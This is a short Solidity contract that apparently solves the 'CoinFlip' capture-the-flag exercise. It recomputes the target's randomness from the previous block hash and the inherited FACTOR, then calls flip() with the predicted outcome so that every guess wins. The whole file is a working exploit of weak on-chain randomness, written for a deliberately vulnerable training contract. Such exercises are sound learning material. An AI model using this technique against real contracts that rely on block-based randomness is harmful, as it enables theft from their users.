// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipToHackV2 is CoinFlip {

    using SafeMath for uint256;

    CoinFlip public instanceToHack;
    
    // get instance of CoinFlip to hack:
    function setInstance(CoinFlip _instanceAddress) public {
        instanceToHack = CoinFlip(_instanceAddress);
    }

    // hack the instance, i.e. CoinFlip
    function hackCoinFlip(bool _guess) public {

        uint256 blockValueHack = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlipHack = blockValueHack.div(FACTOR);
        bool sideHack = coinFlipHack == 1 ? true : false;

        // if a guess equals to side, use guess to flip()
        if (sideHack == _guess) {
            instanceToHack.flip(_guess);
        // if a guess does not equal to side, use the opposite guess to flip()
        } else {
            instanceToHack.flip(!_guess);
        }
    }

    function getConsecutiveWins() public view returns(uint256) {
        return uint256(instanceToHack.consecutiveWins());
        }

}